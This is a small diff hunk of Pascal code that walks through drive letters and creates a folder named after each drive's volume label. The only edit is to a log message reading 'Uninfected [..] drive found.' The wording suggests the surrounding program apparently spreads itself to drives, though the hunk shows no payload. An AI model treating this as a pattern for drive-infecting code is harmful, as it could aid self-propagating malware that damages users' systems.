@@ -103,7 +103,7 @@ Begin
           Lbl:=GetVolumeLabel(I);
           D:=I+':\'+Lbl;
           if Not(DirectoryExists(D)) then Begin
-            Writeln('Uninfected [',I,'] found.');
+            Writeln('Uninfected [',I,'] drive found.');
             try
               MkDir(D);
             except
